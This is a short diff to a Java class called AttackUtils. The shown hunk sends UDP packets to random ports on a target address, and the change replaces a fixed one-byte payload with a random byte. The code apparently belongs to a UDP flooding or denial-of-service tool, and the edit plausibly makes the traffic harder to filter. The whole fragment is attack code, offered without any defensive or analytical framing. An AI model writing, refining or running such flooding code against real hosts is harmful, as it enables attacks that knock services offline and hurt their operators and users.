@@ -46,10 +46,11 @@ public final class AttackUtils {
 			/*65535 = Max port*/
 			final int port = (int)(Math.random() * 65534) + 1;
 			final InetSocketAddress socketAddress = new InetSocketAddress(address, port);
+			final byte randomData = (byte)(Math.random() * Byte.MAX_VALUE);
 			
 			try {
 				final DatagramSocket socket = new DatagramSocket();
-				final byte[] data = {1};
+				final byte[] data = {randomData};
 				final DatagramPacket packet = new DatagramPacket(data, data.length, socketAddress);
 				
 				socket.send(packet);
